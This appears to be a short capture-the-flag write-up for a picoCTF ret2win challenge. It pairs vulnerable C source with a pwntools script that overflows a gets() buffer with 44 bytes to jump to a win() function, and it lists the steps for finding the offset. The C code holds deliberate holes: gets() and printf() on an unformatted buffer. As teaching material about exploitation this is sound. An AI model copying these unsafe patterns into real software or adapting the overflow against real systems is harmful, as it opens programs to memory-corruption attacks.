# Ret2Win example

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
## Exploit
```python
from pwn import *

host = 'saturn.picoctf.net'
port = 56983

p = remote(host, port)

win_addr = p32(0x080491f6)

payload = b'A' * 44 + win_addr

p.sendline(payload)
response = p.recvall(timeout=5)
print(f"{response.decode('utf-8')}")
```

## Steps

* Analyze the code and obtain [vulnerable functions](rsc/vuln_functions/README.md)
* [Fuzzing](rsc/fuzzing/README.md)
* Generate [deBruijin sequence](rsc/deBruijin/README.md) to inject into the vulnerable section of the binary and check the [offset](rsc/offset/README.md)
* Obtain the pattern offset(44)
* Obtain *win()* function(0x080491f6)
* Exploiting!
